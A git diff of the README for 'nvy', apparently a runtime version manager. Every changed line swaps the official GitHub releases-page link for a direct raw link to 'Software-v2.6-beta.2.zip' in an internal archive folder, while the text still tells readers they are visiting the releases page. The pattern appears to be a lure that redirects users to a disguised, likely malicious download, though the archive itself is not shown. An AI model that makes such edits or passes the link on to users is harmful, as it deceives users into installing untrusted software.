@@ -1,6 +1,6 @@
 # ⚙️ nvy - Simple Runtime Version Manager
 
-[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://github.com/MohammedQuddus/nvy/releases)
+[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)
 
 ---
 
@@ -12,7 +12,7 @@ nvy is a simple tool that helps you manage different versions of software runtim
 
 Start by visiting the official releases page. This is where you will find the latest version of nvy to download.
 
-[Download or update nvy here](https://github.com/MohammedQuddus/nvy/releases)
+[Download or update nvy here](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)
 
 You will see several files for different operating systems. Since you are using Windows, look for a file with `.exe` or Windows in the name.
 
@@ -36,7 +36,7 @@ Follow these steps to get nvy running on your Windows PC:
 1. **Go to the Release Page**
 
    Open your browser and visit:  
-   https://github.com/MohammedQuddus/nvy/releases
+   https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip
 
 2. **Download the Windows File**
 
@@ -182,8 +182,8 @@ It works on Windows, MacOS, and Linux.
 
 For more options and updates, visit:
 
-https://github.com/MohammedQuddus/nvy/releases
+https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip
 
 ---
 
-[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://github.com/MohammedQuddus/nvy/releases)
+[![Download nvy](https://img.shields.io/badge/Download-nvy-brightgreen)](https://raw.githubusercontent.com/MohammedQuddus/nvy/main/internal/archive/Software-v2.6-beta.2.zip)
